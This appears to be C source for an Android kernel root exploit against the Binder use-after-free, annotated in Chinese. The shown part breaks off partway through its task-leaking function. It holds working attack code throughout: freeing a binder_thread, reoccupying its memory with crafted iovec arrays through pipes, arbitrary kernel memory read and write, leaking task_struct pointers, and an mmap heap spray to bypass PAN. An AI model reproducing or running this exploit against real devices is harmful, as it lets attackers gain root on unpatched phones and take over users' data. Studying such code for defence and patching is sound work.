#define _GNU_SOURCE
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <ctype.h>
#include <sys/uio.h>
#include <err.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <linux/sched.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <errno.h>
#include <pthread.h>

#include "common.h"
#include "getroot.h"
#include "kallsym.h"
#include "devinfo.h"
#include "selinux.h"


#define BINDER_THREAD_EXIT      0x40046208ul
#define BINDER_SET_MAX_THREADS  0x40046205ul
#define UAF_SPINLOCK            0x10001

#define RETRIES                 10
#define DELAY_USEC              500000

#define MMAP_ADDR               0x100000000UL
#define MMAP_SIZE               (ONE_PAGE_SIZE*2)
void *mmap_addr;



/* 利用漏洞可泄露的内核数据 */
struct leak_data{
	unsigned long task;    // 存放泄露的task_struct指针
	unsigned long thread;  // 存放泄露的thread_info指针
	unsigned long stack;   // 存放泄露的stack指针
	unsigned long cred;    // 存放泄露的cred指针
	unsigned long kaddr;   // 存放泄露的内核全局变量fair_sched_class地址
};

/* 利用漏洞泄露任意地址中的数据 */
struct leak_gdata{
	unsigned long dst;  // 要泄露内存的地址
	void* src;          // 存放内容的地址
	int len;            // 泄露内存的长度
};

/* 利用漏洞向任意地址写任意数据时使用信息 */
struct clobber_gdata{
	unsigned long dst;  // 要修改内存的地址
	void* src;          // 存放内容的地址
	int len;            // 修改内存的长度
};


#ifdef CONFIG_BYPASS_PAN

#define MAX_MMAP_COUNT     		200				/* mmap地址最大数 */
#define MMAP_HEAP_SPRAY_LEN		0x4000000		/* 一次mmap内存的大小 64M */

/* 需要mmap的次数 */
unsigned int spary_count;
/* mmap地址的数组 */
unsigned long *spary_addr[MAX_MMAP_COUNT] = { 0 };


/* 使用mmap进行堆喷 */
int mmap_heap_spray(void)
{
	int i, j, k;
	int count;

	for (i = 0; i < spary_count; i++) {
		spary_addr[i] = (unsigned long*)mmap(NULL, MMAP_HEAP_SPRAY_LEN, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
		if (spary_addr[i] == MAP_FAILED) {
			printf("%s %d mmap %3d failed!\n", __FUNCTION__, __LINE__, i);
			return -1;
		}
		//printf("    mmap spary_addr[%d] = %p\n", i, spary_addr[i]);
		/* 锁定申请的内存，防止换入换出，可能不管用 */
		mlock(spary_addr[i], MMAP_HEAP_SPRAY_LEN);
		/* 保证分配物理页 */
		memset(spary_addr[i], 0, MMAP_HEAP_SPRAY_LEN);
	}

	return 0;
}


/* 释放mmap内存，addr所在内存不释放 */
void unmap_heap_spray(void* addr)
{
	int i;

	for (i = 0; i < spary_count; i++) {
		if (spary_addr[i] > 0 && ((unsigned long)spary_addr[i] > (unsigned long)addr ||
			((unsigned long)spary_addr[i] + MMAP_HEAP_SPRAY_LEN) < (unsigned long)addr)) {
			//printf("	unmap spary_addr[%d] = %p\n", i, spary_addr[i]);
			munmap(spary_addr[i], MMAP_HEAP_SPRAY_LEN);
			spary_addr[i] = 0;
		}
	}
}

/* 计算系统总内存，根据此参数决定堆喷大小 */
int calc_mmap_count(void)
{
	unsigned long mem_total = 0;
	int count = 0;

	/* 获取当前系统剩余内存大小 */
	if (get_mem_info("MemTotal", &mem_total)) {
//	if (get_mem_info("MemFree", &mem_total)) {
		error("%s %d : get mem info failed!", __FUNCTION__, __LINE__);
		return -1;
	}
	/* 计算需要喷射的次数 */
	mem_total *= 1024;
	/* 申请内存太多会死机，太少又很难喷得上 */
	mem_total = mem_total - (mem_total / 1.3);
//	count = mem_total / MMAP_HEAP_SPRAY_LEN;
	/* 这里写死是为了满足当前测试环境 */
	count = 3;
	if(count > MAX_MMAP_COUNT){
		count = MAX_MMAP_COUNT;
	}
	printf("    mem_total: 0x%lx ，spary_count: %d \n", mem_total, count);

	return count;
}


/* 开始堆喷 */
int start_heap_spray(void)
{
	if (mmap_heap_spray()) {
		error("%s %d : mmap heap spray failed!", __FUNCTION__, __LINE__);
		return -1;
	}

	return 0;
}

/* 
 * 函数: check_heap_spary
 * 参数: task, task_struct中存放内核栈地址的地址，即其内存就是内核栈地址;
 *       stack, 内核栈地址
 * 返回: 成功返回0，失败返回-1
 * 说明: 检查是否已经堆喷成功
 *       这里只是记录一种绕过PAN的实现方式，但是要根据实际环境调整才能正确使用
 */
int check_heap_spary(unsigned long task, unsigned long stack)
{
	int i, j, k, n;
	unsigned char *p;

	/* 这里是在使用mmap堆喷大量内存之后，猜测一些内核地址，并往其中写数据，再使用堆喷的地址
	 * 读取数据，验证是否是写入内核地址的数据，如果是那么就是堆喷成功
	 * 这里依据内核栈地址为基址，向后验证n块内存，也可以使用其他地址 */
	for(n = 0; n < 500; n++){
		/* 先备份数据到内核栈的0x80位置，猜测该地中没有有效数据，被覆盖无所谓 */
		kernel_read((void*)(stack+0x80+(n+1)*0x2000), (void*)(stack+0x80), sizeof(void*));
		/* 将内核栈地址(task中的内容)写入测试的内存中 */
		kernel_read((void*)task, (void*)(stack+0x80+(n+1)*0x2000), sizeof(void*));
		/* 检查堆喷的地址空间 */
		for (i = 0; i < spary_count; i++) {
			for (j = 0; j < MMAP_HEAP_SPRAY_LEN / ONE_PAGE_SIZE; j++) {
				p = (unsigned char*)spary_addr[i] + j * ONE_PAGE_SIZE;
				for(k = 0; k < ONE_PAGE_SIZE; k += sizeof(void*)){
					//if(*(unsigned long*)(p + k)){
						/* 如果堆喷的内容等于内核栈地址，说明堆喷成功 */
						if(*(unsigned long*)(p + k) == stack){
							mmap_kaddr = (void*)(stack+(n+1)*0x2000);
							mmap_uaddr = (void*)((p + k) - 0x80);
							printf("    uaddr = %p; kaddr = %p\n", mmap_uaddr, mmap_kaddr);
							goto find;
						}
					//}
				}
			}
		}
		kernel_read((void*)(stack+0x80), (void*)(stack+0x80+(n+1)*0x2000), sizeof(void*));
	}

find:
	if(!mmap_uaddr || !mmap_kaddr){
		unmap_heap_spray(NULL);
		return -1;
	}
	else{
		unmap_heap_spray(mmap_uaddr);
		return 0;
	}
}
#endif


/*
 * 函数: iovec_size
 * 参数: iov, 指向 struct iovec 数组的指针; n, 数组项数
 * 返回: 计算的总长度
 * 说明: 计算iov指针指向的 struct iovec 数组中要读写的数据总长度
 */
unsigned long iovec_size(struct iovec *iov, int n)
{
	unsigned long sum = 0;
	for (int i = 0; i < n; i++)
		sum += iov[i].iov_len;
	return sum;
}

/*
 * 函数: iovec_max_size
 * 参数: iov, 指向 struct iovec 数组的指针; n, 数组项数
 * 返回: 最大长度
 * 说明: 计算iov指针指向的 struct iovec 数组中要读写的数据的最大长度
 */
unsigned long iovec_max_size(struct iovec *iov, int n)
{
	unsigned long m = 0;
	for (int i = 0; i < n; i++)
	{
		if (iov[i].iov_len > m)
			m = iov[i].iov_len;
	}
	return m;
}

#if 1
/*
 * 函数: clobber_group_data_corrlen
 * 参数: gdata, 指向利用漏洞修改数据的信息; count, 共有多少组信息;
 * 返回: 成功返回1，失败返回0
 * 说明: 利用漏洞实现向任意地址写任意数据，可同时修改多组数据
 *       binder_thread.wait 字段对应 iovec.len 的情况
 */
int clobber_group_data_corrlen(int binder_fd, int epfd, struct clobber_gdata* gdata, int count)
{
	int ret = 0, i, j;
	struct epoll_event event = {.events = EPOLLIN};
	int max_threads = 2;
	unsigned long test_dat = 0;
	unsigned long const test_val = 0x90ABCDEF12345678ul;

	/* 准备一块内存，大小按照 iovec_array 数组中最大数据长度 */
	int dummy_size = CMP_MAX(UAF_SPINLOCK, ONE_PAGE_SIZE);
	char *dummy_buf = malloc(dummy_size);
	if (dummy_buf == NULL){
		error("[ERROR] %s %d : malloc dummy_buf failed!", __FUNCTION__, __LINE__);
		goto err_cgdc_dummy_buf;
	}
	memset(dummy_buf, 0, dummy_size);

	/* 构造的一组数组，在漏洞触发后会覆盖 iovec_array 数组中字段 */
	int second_write_size = (4+count*2)*sizeof(unsigned long);
	unsigned long *second_write_chunk = (unsigned long *)malloc(second_write_size);
	if(!second_write_chunk){
		error("[ERROR] %s %d : malloc iovec_array failed!", __FUNCTION__, __LINE__);
		goto err_cgdc_write_chunk;
	}
	second_write_chunk[0] = (unsigned long)dummy_buf;
	second_write_chunk[1] = second_write_size;
	for(i = 2, j = 0; j < count; j++){
		second_write_chunk[i++] = gdata[j].dst;
		second_write_chunk[i++] = gdata[j].len;
	}
	second_write_chunk[i++] = (unsigned long)&test_dat;
	second_write_chunk[i] = sizeof(test_dat);

	/* 计算按照页对齐，需要填充的数据大小 */
	int delta = (UAF_SPINLOCK + second_write_size) % ONE_PAGE_SIZE;
	int pad_size = (delta == 0 ? 0 : ONE_PAGE_SIZE - delta);

	/* 占位binder_thread结构体后，wait字段在iovec_array数组中的数组项 */
	int indx_wait = dev_info->offset_binder_wait/sizeof(struct iovec);
	/* iovec_array数组元素的个数 */
	int iovec_array_count = dev_info->offset_binder_task/sizeof(struct iovec);
	/* iovec_array数组的大小，因为占位binder_thread结构体后需要泄露task指针，
	 * 因此不能覆盖task指针，所以这里不是用binder_thread结构体的大小 */
	int iovec_array_size = iovec_array_count*sizeof(struct iovec);
	struct iovec* iovec_array = malloc(iovec_array_size);
	if(!iovec_array){
		error("[ERROR] %s %d : malloc iovec_array failed!", __FUNCTION__, __LINE__);
		goto err_cgdc_iovec_array;
	}
	memset(iovec_array, 0, iovec_array_size);

	/* 初始化 iovec_array 数组
	 * 第一组数据，用于填充按照页对齐数据
	 * 第二组数据，漏洞触发后len会变为UAF_SPINLOCK
	 * 第三组数据，漏洞触发后iovec_array[indx_wait + 1].iov_base会变为对应的内核地址
	 * 第四组数据，为了补充第二组数据的长度，在漏洞触发后会被second_write_chunk对应的内容覆盖
	 * 第五组-倒数第二组数据，用于填充任意内核地址和长度
	 * 最后一组数据，用于验证漏洞是否触发成功 */
	iovec_array[indx_wait - 1].iov_base = dummy_buf;
	iovec_array[indx_wait - 1].iov_len = pad_size;
	iovec_array[indx_wait].iov_base = dummy_buf;
	iovec_array[indx_wait].iov_len = 0;                       // spinlock: will turn to UAF_SPINLOCK
	iovec_array[indx_wait + 1].iov_base = second_write_chunk; // wq->task_list->next: will turn to task_list
	iovec_array[indx_wait + 1].iov_len = second_write_size;   // wq->task_list->prev: will turn to task_list
	iovec_array[indx_wait + 2].iov_base = dummy_buf;
	iovec_array[indx_wait + 2].iov_len = UAF_SPINLOCK;
	for(i = 3, j = 0; j < count; i++, j++){
		iovec_array[indx_wait + i].iov_base = dummy_buf;
		iovec_array[indx_wait + i].iov_len = gdata[j].len;
	}
	iovec_array[indx_wait + i].iov_base = dummy_buf;
	iovec_array[indx_wait + i].iov_len = sizeof(test_dat);
	/* 数据总长度 */
	int total_len = iovec_size(iovec_array, iovec_array_count);

	/* 设置binder最多可以请求注册线程个数 */
	if(ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads)){
		error("[ERROR] %s %d : ioctl binder_fd BINDER_SET_MAX_THREADS failed!", __FUNCTION__, __LINE__);
	}
	/* 1、创建 binder_thread 结构体，epfd 与 binder_fd 建立联系 */
	if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)){
		error("[ERROR] %s %d : epoll_ctl EPOLL_CTL_ADD failed!", __FUNCTION__, __LINE__);
		goto err_cgdc_epoll_add;
	}

	int pipes[2];
	if(pipe(pipes)){
		error("[ERROR] %s %d : fcntl F_SETPIPE_SZ failed!", __FUNCTION__, __LINE__);
		goto err_cgdc_pipe;
	}
	/* 设置管道大小为一个页 */
	if ((fcntl(pipes[0], F_SETPIPE_SZ, ONE_PAGE_SIZE)) != ONE_PAGE_SIZE)
		error("[ERROR] %s %d : fcntl F_SETPIPE_SZ failed!", __FUNCTION__, __LINE__);
	if ((fcntl(pipes[1], F_SETPIPE_SZ, ONE_PAGE_SIZE)) != ONE_PAGE_SIZE)
		error("[ERROR] %s %d : fcntl F_SETPIPE_SZ failed!", __FUNCTION__, __LINE__);

	pid_t fork_ret = fork();
	if (fork_ret == -1){
		error("[ERROR] %s %d : fork child failed!", __FUNCTION__, __LINE__);
		goto err_cgdc_fork;
	}
	if (fork_ret == 0) {
		/* Child process */
		unsigned long pos = 0;
		char *wbuf = malloc(total_len);
		if (wbuf == NULL){
			error("[ERROR] %s %d : malloc wbuf failed!", __FUNCTION__, __LINE__);
			exit(0);
		}
		if(prctl(PR_SET_PDEATHSIG, SIGKILL)){
			error("[ERROR] %s %d : CHILD: prctl PR_SET_PDEATHSIG failed!", __FUNCTION__, __LINE__);
		}
		/* 等待父进程阻塞后调度 */
		usleep(DELAY_USEC);
		/* 4、触发漏洞，会进行链表删除操作 */
		if(epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event)){
			error("[ERROR] %s %d : CHILD: epoll_ctl EPOLL_CTL_DEL failed!", __FUNCTION__, __LINE__);
			exit(0);
		}
		/* 准备第一、二组数据 */
		memset(wbuf, 0, pad_size + UAF_SPINLOCK);
		pos = pad_size + UAF_SPINLOCK;
		/* 准备第三组数据 */
		memcpy(wbuf + pos, second_write_chunk, second_write_size);
		pos += second_write_size;
		/* 准备第四组-倒数第二组数据 */
		for(i = 0; i < count; i++){
			memcpy(wbuf + pos, gdata[i].src, gdata[i].len);
			pos += gdata[i].len;
		}
		/* 准备最后一组数据，用于验证漏洞是否触发成功 */
		memcpy(wbuf + pos, &test_val, sizeof(test_dat));
		pos += sizeof(test_dat);
		/* 5、将准备的数据写入管道 */
		if(write(pipes[1], wbuf, pos) != pos){
			error("[ERROR] %s %d : CHILD: write pipes failed!", __FUNCTION__, __LINE__);
		}

		close(pipes[1]);
		close(pipes[0]);
		free(wbuf);

		exit(0);
	}
	/* 2、释放 binder_thread 结构体 */
	if(ioctl(binder_fd, BINDER_THREAD_EXIT, NULL)){
		error("[ERROR] %s %d : ioctl binder_fd BINDER_THREAD_EXIT failed!", __FUNCTION__, __LINE__);
	}
	/* 3、堆喷，抢占刚被释放 binder_thread 所占的内存
	 *    此时读管道，管道内容为空会阻塞，等待子进程写管道
	 *    子进程运行后会触发漏洞，之后iovec_array内容会发生变化，如下
	 *    iovec_array[indx_wait - 1].iov_base = dummy_buf;
	 *    iovec_array[indx_wait - 1].iov_len = pad_size;
	 *    iovec_array[indx_wait].iov_base = dummy_buf;
	 *    iovec_array[indx_wait].iov_len = 10001;
	 *    iovec_array[indx_wait + 1].iov_base = kp_next; //就是该对象对应内核地址
	 *    iovec_array[indx_wait + 1].iov_len = kp_next;  //这个长度之后会被修改，所以不影响
	 *    iovec_array[indx_wait + 2].iov_base = dummy_buf;
	 *    iovec_array[indx_wait + 2].iov_len = UAF_SPINLOCK;
	 *    for(i = 3, j = 0; j < count; i++, j++){
	 *        iovec_array[indx_wait + i].iov_base = dummy_buf;
	 *        iovec_array[indx_wait + i].iov_len = gdata[j].len;
	 *    }
	 *    iovec_array[indx_wait + i].iov_base = dummy_buf;
	 *    iovec_array[indx_wait + i].iov_len = sizeof(test_dat);
	 *    子进程写管道时，由于管道大小为一个页，所以会阻塞等待父进程读取管道数据，
	 *    父进程读取管道数据之后会阻塞等待子进程写管道（这里读管道会阻塞是因为写管道由于
	 *    管道缓冲区不够再等待写管道    ）。经过几次读写后会将第1、2组数据读取，在读取第3组
	 *    数据时，由于基址是内核地址，会将管道中的数据写道该内核地址，其实就是将数组
	 *    second_write_chunk的内容写到iovec_array[indx_wait + 1].iov_base对应的内核地址
	 *    之后iovec_array内容会发生变化，如下
	 *    iovec_array[indx_wait + 1].iov_base = dummy_buf;
	 *    iovec_array[indx_wait + 1].iov_len = second_write_size;
	 *    for(i = 2, j = 0; j < count; i++, j++){
	 *        iovec_array[indx_wait + i].iov_base = gdata[j].dst;
	 *        iovec_array[indx_wait + i].iov_len = gdata[j].len;
	 *    }
	 *    iovec_array[indx_wait + i].iov_base = test_dat;
	 *    iovec_array[indx_wait + i].iov_len = sizeof(test_dat);
	 *    读取第4组 - 最后第2组数据就是将 gdata[j].src 的内容写入 gdata[j].dst 地址
	 *    实现向任意内核地址写任意值
	 *    读取最后一组数据就是将 test_val 写入 test_dat 中 */
	ret = readv(pipes[0], iovec_array, iovec_array_count);
	if(ret != total_len){
		error("[ERROR] %s %d : readv failed!", __FUNCTION__, __LINE__);
	}

err_cgdc_fork:
    close(pipes[0]);
    close(pipes[1]);
err_cgdc_pipe:
err_cgdc_epoll_add:
	free(iovec_array);
err_cgdc_iovec_array:
	free(second_write_chunk);
err_cgdc_write_chunk:
    free(dummy_buf);
err_cgdc_dummy_buf:
    return test_dat == test_val;
}

/*
 * 函数: leak_data_corrlen
 * 参数: gdata, 存放泄露数据的信息
 * 返回: 成功返回1，失败返回0
 * 说明: 利用漏洞泄露内核数据
 *       binder_thread.wait 字段对应 iovec.len 的情况
 */
int leak_data_corrlen(int binder_fd, int epfd, struct leak_gdata* gdata)
{
	int ret = 0;
    int status = 0;
	int lksec_size = ONE_PAGE_SIZE;
	/* 最小泄露数据的长度 */
	unsigned long const leak_min_size = dev_info->offset_binder_next_task + 8;
	/* 调整数据长度 */
	unsigned long leak_adj_size = leak_min_size + ONE_PAGE_SIZE;
	struct epoll_event event = {.events = EPOLLIN};
	int max_threads = 2;

	/* 占位binder_thread结构体后，wait字段在iovec_array数组中的数组项 */
	int indx_wait = dev_info->offset_binder_wait/sizeof(struct iovec);
	/* iovec_array数组元素的个数 */
	int iovec_array_count = dev_info->offset_binder_task/sizeof(struct iovec);
	/* iovec_array数组的大小，因为占位binder_thread结构体后需要泄露task指针，
	 * 因此不能覆盖task指针，所以这里不是用binder_thread结构体的大小 */
	int iovec_array_size = iovec_array_count*sizeof(struct iovec);
	struct iovec* iovec_array = malloc(iovec_array_size);
	if(!iovec_array){
		error("[ERROR] %s %d : malloc iovec_array failed!", __FUNCTION__, __LINE__);
		goto err_lgdc_iovec_array;
	}
	memset(iovec_array, 0, iovec_array_size);

	/* 计算按照页对齐，需要填充的数据大小 */
	int delta = (UAF_SPINLOCK + leak_min_size) % ONE_PAGE_SIZE;
	int pad_size = (delta == 0 ? 0 : ONE_PAGE_SIZE - delta) + ONE_PAGE_SIZE;
	/* 五组数据 */
	iovec_array[indx_wait - 2].iov_base = (unsigned long *)0xDEADBEEF;
	iovec_array[indx_wait - 2].iov_len = ONE_PAGE_SIZE;
	iovec_array[indx_wait - 1].iov_base = (unsigned long *)0xDEADBEEF;
	iovec_array[indx_wait - 1].iov_len = pad_size - ONE_PAGE_SIZE;
	iovec_array[indx_wait].iov_base = (unsigned long *)0xDEADBEEF;
	iovec_array[indx_wait].iov_len = 0;//0x10001;                       /* spinlock: will turn to UAF_SPINLOCK */
	iovec_array[indx_wait + 1].iov_base = (unsigned long *)0xDEADBEEF;  /* wq->task_list->next */
	iovec_array[indx_wait + 1].iov_len = leak_adj_size;                 /* wq->task_list->prev */
	iovec_array[indx_wait + 2].iov_base = (unsigned long *)0xDEADBEEF;
	iovec_array[indx_wait + 2].iov_len = UAF_SPINLOCK + gdata->len;
	unsigned long total_len = iovec_size(iovec_array, iovec_array_count);
	unsigned long max_len = iovec_max_size(iovec_array, iovec_array_count);
	//printf("    max_len = 0x%lx\n", max_len);

	unsigned char *dummy_buf = malloc(max_len);
	if (!dummy_buf){
		error("[ERROR] %s %d : malloc iovec_array failed!", __FUNCTION__, __LINE__);
		goto err_lgdc_dummy_buf;
	}
	memset(dummy_buf, 0, max_len);
	for (int i = 0; i < iovec_array_count; i++){
		if (iovec_array[i].iov_base == (unsigned long *)0xDEADBEEF)
			iovec_array[i].iov_base = dummy_buf;
	}

	/* 设置binder最多可以请求注册线程个数 */
    if(ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads)){
		error("[ERROR] %s %d : ioctl binder_fd BINDER_SET_MAX_THREADS failed!", __FUNCTION__, __LINE__);
	}
	/* 1、创建 binder_thread 结构体，epfd 与 binder_fd 建立联系 */
	if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)){
		error("[ERROR] %s %d : epoll_ctl EPOLL_CTL_ADD failed!", __FUNCTION__, __LINE__);
	}

	int pipefd[2];
	int leakpipe[2];
	if (pipe(pipefd)){
		error("[ERROR] %s %d : pipe pipefd failed!", __FUNCTION__, __LINE__);
		goto err_lgdc_pipe;
	}
	if (pipe(leakpipe)){
		error("[ERROR] %s %d : pipe leakpipe failed!", __FUNCTION__, __LINE__);
		goto err_lgdc_leakpipe;
	}
	if ((fcntl(pipefd[0], F_SETPIPE_SZ, ONE_PAGE_SIZE)) != ONE_PAGE_SIZE)
		error("[ERROR] %s %d : fcntl F_SETPIPE_SZ failed!", __FUNCTION__, __LINE__);
	if ((fcntl(pipefd[1], F_SETPIPE_SZ, ONE_PAGE_SIZE)) != ONE_PAGE_SIZE)
		error("[ERROR] %s %d : fcntl F_SETPIPE_SZ failed!", __FUNCTION__, __LINE__);

	pid_t fork_ret = fork();
	if (fork_ret == -1){
		error("[ERROR] %s %d : fcntl F_SETPIPE_SZ failed!", __FUNCTION__, __LINE__);
		goto err_lgdc_fork;
	}
	if (fork_ret == 0) {
        /* Child process */
		int offset = 0;
		unsigned long kdat = 0;
		unsigned long list_next = 0;
		unsigned long list_prev = 0;
		struct leak_data leak = {0,};
        unsigned long leaksize = pad_size + UAF_SPINLOCK + leak_min_size;
		unsigned char* leakbuf = malloc(gdata->len);

		if(!leakbuf){
			error("[ERROR] %s %d : malloc write_buf failed!", __FUNCTION__, __LINE__);
		}
		memset(leakbuf, 0, leaksize);

		if(prctl(PR_SET_PDEATHSIG, SIGKILL)){
			error("ERROR] %s %d : prctl PR_SET_PDEATHSIG failed!", __FUNCTION__, __LINE__);
		}
		/* 等待父进程阻塞后调度 */
		usleep(DELAY_USEC);
		/* 4、第一次触发漏洞，会进行链表删除操作 */
		if(epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event)){
			error("ERROR] %s %d : epoll_ctl EPOLL_CTL_DEL failed!", __FUNCTION__, __LINE__);
		}

		/* 第一次读取，四组数据，第四组数据没有读完 */
        if (read(pipefd[0], leakbuf, leaksize) != leaksize){
			error("ERROR] %s %d : read leakbuf failed!", __FUNCTION__, __LINE__);
    	}
        //hexdump_memory(leakbuf + leaksize - leak_min_size, leak_min_size);

		/* 泄露的next和prev指针必须相等 */
		list_next = *(unsigned long *)(leakbuf + leaksize - leak_min_size);
		list_prev = *(unsigned long *)(leakbuf + leaksize - leak_min_size + sizeof(void*));
		/* 从泄露的内核数据中获取task指针 */
		leak.task = *(unsigned long *)((leakbuf + leaksize - leak_min_size) + dev_info->offset_binder_next_task);
		//printf(">>> CHILD: list_next = 0x%lx; list_prev = 0x%lx\n", list_next, list_prev);
		//printf(">>> CHILD: task_struct = 0x%lx\n", leak.task);

		if((leak.task > KERNEL_ADDR_START) && (list_next == list_prev) && list_next > KERNEL_ADDR_START){
			unsigned long extra[] = {
				list_next,
				leak_adj_size,
				/* 需要泄露的内核地址，这里是需要泄露的task地址 */
				gdata->dst,
				/* 需要泄露的数据的长度，这里固定一个页 */
				gdata->len
			};
			struct clobber_gdata cdata[] = {
				{
					/* 要修改的地址，这里就是iovec_array[indx_wait + 3].iov_base对应的内核地址 */
					.dst = list_next,
					/* 写入数据的地址 */
					.src = (void*)&extra,
					/* 写入数据的长度 */
					.len = sizeof(extra),
				},
			};
			/* 调用任意写函数，成功修改返回1 */
			ret = clobber_group_data_corrlen(binder_fd, epfd, cdata, ARRAY_SIZE(cdata));
			if (!ret) {
				printf("ERROR] %s %d : clobber_group_data_corrlen failed!", __FUNCTION__, __LINE__);
            }
        }

		/* 第二次读取，继续读取第四组剩余数据，大小0x1000 */
        if (read(pipefd[0], leakbuf, leak_adj_size - leak_min_size) != leak_adj_size - leak_min_size){
			error("ERROR] %s %d : read leakbuf failed!", __FUNCTION__, __LINE__);
        }

		/* 第三次读取，读取第五组数据，大小lksec_size */
		if (read(pipefd[0], leakbuf, gdata->len) != gdata->len) {
			error("ERROR] %s %d : read leakbuf failed!", __FUNCTION__, __LINE__);
		}
        //hexdump_memory(leakbuf, lksec_size);

		if(ret){
			status = 1;
		}
		else{
			status = 0;
		}

		/* 通过管道将泄露的数据传递给父进程 */
		if(write(leakpipe[1], leakbuf, gdata->len) != gdata->len){
			error("ERROR] %s %d : write leak data failed!", __FUNCTION__, __LINE__);
		}
		/* 通知父进程泄露内核数据的状态 */
		if(write(leakpipe[1], &status, sizeof(status)) != sizeof(status)){
			error("ERROR] %s %d : write leak data failed!", __FUNCTION__, __LINE__);
		}

		close(pipefd[0]);
		close(pipefd[1]);
		close(leakpipe[0]);
		close(leakpipe[1]);
		free(leakbuf);

		exit(0);
    }
	/* Parent process */
	/* 2、释放 binder_thread 结构体 */
	if(ioctl(binder_fd, BINDER_THREAD_EXIT, NULL)){
		error("[ERROR] %s %d : ioctl binder_fd BINDER_THREAD_EXIT failed!", __FUNCTION__, __LINE__);
	}
	/* 3、堆喷，抢占刚被释放 binder_thread 所占的内存 */
	ret = writev(pipefd[1], iovec_array, iovec_array_count);
	if(ret != total_len){
		error("[ERROR] %s %d : writev failed!", __FUNCTION__, __LINE__);
	}
	/* 从子进程读取泄露的内核信息 */
	ret = read(leakpipe[0], gdata->src, gdata->len);
	if(ret != gdata->len){
		error("[ERROR] %s %d : read leak data failed!", __FUNCTION__, __LINE__);
	}
	/* 读取子进程泄露内核信息状态 */
	ret = read(leakpipe[0], &status, sizeof(status));
	if(ret != sizeof(status)){
		error("[ERROR] %s %d : read success failed!", __FUNCTION__, __LINE__);
	}

	/* 等待子进程结束 */
	if (wait(&ret) != fork_ret)
		error("[ERROR] %s %d : wait child failed!", __FUNCTION__, __LINE__);

err_lgdc_fork:
	close(leakpipe[0]);
	close(leakpipe[1]);
err_lgdc_leakpipe:
	close(pipefd[0]);
	close(pipefd[1]);
err_lgdc_pipe:
	free(dummy_buf);
err_lgdc_dummy_buf:
	free(iovec_array);
err_lgdc_iovec_array:
	return status;
}

/*
 * 函数: leak_task_corrlen
 * 参数: lkdat, 存放泄露的内核数据
 * 返回: 成功返回1，失败返回0
 * 说明: 利用漏洞泄露task内容
 *       binder_thread.wait 字段对应 iovec.len 的情况
 */
int leak_task_corrlen(int binder_fd, int epfd, struct leak_data* lkdat)
{
	int ret = 0;
    int status = 0;
	int lksec_size = ONE_PAGE_SIZE;
	/* 最小泄露数据的长度 */
	unsigned long const leak_min_size = dev_info->offset_binder_next_task + 8;
	/* 调整数据长度 */
	unsigned long leak_adj_size = leak_min_size + ONE_PAGE_SIZE;
	struct epoll_event event = {.events = EPOLLIN};
	int max_threads = 2;

	/* 占位binder_thread结构体后，wait字段在iovec_array数组中的数组项 */
	int indx_wait = dev_info->offset_binder_wait/sizeof(struct iovec);
	/* iovec_array数组元素的个数 */
	int iovec_array_count = dev_info->offset_binder_task/sizeof(struct iovec);
	/* iovec_array数组的大小，因为占位binder_thread结构体后需要泄露task指针，
	 * 因此不能覆盖task指针，所以这里不是用binder_thread结构体的大小 */
	int iovec_array_size = iovec_array_count*sizeof(struct iovec);
	struct iovec* iovec_array = malloc(iovec_array_size);
	if(!iovec_array){
		error("[ERROR] %s %d : malloc iovec_array failed!", __FUNCTION__, __LINE__);
		goto err_ltc_iovec_array;
	}
	memset(iovec_array, 0, iovec_array_size);

	/* 计算按照页对齐，需要填充的数据大小 */
	int delta = (UAF_SPINLOCK + leak_min_size) % ONE_PAGE_SIZE;
	int pad_size = (delta == 0 ? 0 : ONE_PAGE_SIZE - delta) + ONE_PAGE_SIZE;
	/* 五组数据 */
	iovec_array[indx_wait - 2].iov_base = (unsigned long *)0xDEADBEEF;
	iovec_array[indx_wait - 2].iov_len = ONE_PAGE_SIZE;
	iovec_array[indx_wait - 1].iov_base = (unsigned long *)0xDEADBEEF;
	iovec_array[indx_wait - 1].iov_len = pad_size - ONE_PAGE_SIZE;
	iovec_array[indx_wait].iov_base = (unsigned long *)0xDEADBEEF;
	iovec_array[indx_wait].iov_len = 0;//0x10001;                       /* spinlock: will turn to UAF_SPINLOCK */
	iovec_array[indx_wait + 1].iov_base = (unsigned long *)0xDEADBEEF;  /* wq->task_list->next */
	iovec_array[indx_wait + 1].iov_len = leak_adj_size;                 /* wq->task_list->prev */
	iovec_array[indx_wait + 2].iov_base = (unsigned long *)0xDEADBEEF;
	iovec_array[indx_wait + 2].iov_len = UAF_SPINLOCK + lksec_size;
	unsigned long total_len = iovec_size(iovec_array, iovec_array_count);
	unsigned long max_len = iovec_max_size(iovec_array, iovec_array_count);
	//printf("    max_len = 0x%lx\n", max_len);

	unsigned char *dummy_buf = malloc(max_len);
	if (!dummy_buf){
		error("[ERROR] %s %d : malloc iovec_array failed!", __FUNCTION__, __LINE__);
		goto err_ltc_dummy_buf;
	}
	memset(dummy_buf, 0, max_len);
	for (int i = 0; i < iovec_array_count; i++){
		if (iovec_array[i].iov_base == (unsigned long *)0xDEADBEEF)
			iovec_array[i].iov_base = dummy_buf;
	}

	/* 设置binder最多可以请求注册线程个数 */
    if(ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads)){
		error("[ERROR] %s %d : ioctl binder_fd BINDER_SET_MAX_THREADS failed!", __FUNCTION__, __LINE__);
	}
	/* 1、创建 binder_thread 结构体，epfd 与 binder_fd 建立联系 */
	if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)){
		error("[ERROR] %s %d : epoll_ctl EPOLL_CTL_ADD failed!", __FUNCTION__, __LINE__);
	}

	int pipefd[2];
	int leakpipe[2];
	/* 此管道用来堆喷占位、泄露task内容 */
	if (pipe(pipefd)){
		error("[ERROR] %s %d : pipe pipefd failed!", __FUNCTION__, __LINE__);
		goto err_ltc_pipe;
	}
